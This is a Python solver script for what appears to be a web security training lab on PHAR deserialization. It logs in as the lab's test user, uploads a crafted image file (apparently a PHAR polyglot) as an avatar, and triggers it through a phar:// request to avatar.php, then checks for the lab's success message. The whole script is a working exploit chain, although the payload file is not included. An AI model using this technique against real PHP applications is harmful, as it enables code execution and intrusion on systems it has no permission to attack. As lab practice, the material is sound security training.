import requests
import re
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.csrf = None

    def getting_csrf(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def signing_in(self):
        data = {
            'csrf': self.csrf,
            'username': 'wiener',
            'password': 'peter'
        }
        response = self.session.post(self.lab_url + 'login', data=data)
        self.csrf = re.findall('value="(.*)"', response.text)[-1]

    def uploading_the_image(self):
        files = {
            'avatar': open(sys.argv[0].replace('.py', '.jpg'), 'rb'),
            'csrf': (None, self.csrf)
        }
        self.session.post(self.lab_url + 'my-account/avatar', files=files)

    def exploiting(self):
        self.session.get(self.lab_url + 'cgi-bin/avatar.php?avatar=phar://wiener')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_csrf()
        self.signing_in()
        self.uploading_the_image()
        self.exploiting()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
